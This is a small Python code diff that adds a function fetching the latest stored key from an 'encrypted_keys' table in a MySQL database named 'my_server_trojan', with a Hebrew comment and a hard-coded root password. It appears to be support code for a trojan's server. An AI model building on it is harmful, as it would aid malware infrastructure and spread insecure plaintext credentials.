@@ -57,6 +57,23 @@ def mysql_retrieve_last_word():
 
     return word
     
+def mysql_retrieve_last_key():
+    conn = mysql.connector.connect(
+        host="localhost",
+        user="root",
+        password="Galking22!!!",
+        database="my_server_trojan"
+    )
+    cursor = conn.cursor()
+
+    cursor.execute("SELECT key_data FROM encrypted_keys ORDER BY id DESC LIMIT 1")
+    result = cursor.fetchone()  # לדוגמה: (b'...bytes...',)
+    key = result[0] if result else None
+
+    cursor.close()
+    conn.close()
+
+    return key
     
 def generate_aes_key_from_secret(secret_word):
     hasher = SHA256.new()
